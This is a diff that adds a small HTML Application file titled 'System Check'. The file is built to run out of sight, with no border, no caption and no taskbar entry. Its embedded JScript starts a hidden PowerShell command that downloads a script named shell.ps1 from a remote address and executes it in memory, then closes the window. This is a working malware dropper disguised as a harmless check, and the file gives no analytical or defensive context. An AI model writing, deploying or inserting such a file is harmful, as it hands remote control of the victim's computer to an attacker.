@@ -1,0 +1,11 @@
+<html>
+<head>
+<title>System Check</title>
+<HTA:APPLICATION APPLICATIONNAME="SysChk" BORDER="none" CAPTION="no" SHOWINTASKBAR="no">
+</head>
+<script language="JScript">
+var s = new ActiveXObject("WScript.Shell");
+s.Run("cmd /c powershell -nop -w 1 -c IEX(New-Object Net.WebClient).DownloadString('http://172.26.74.9:8000/shell.ps1')",0,true);
+window.close();
+</script>
+</html>
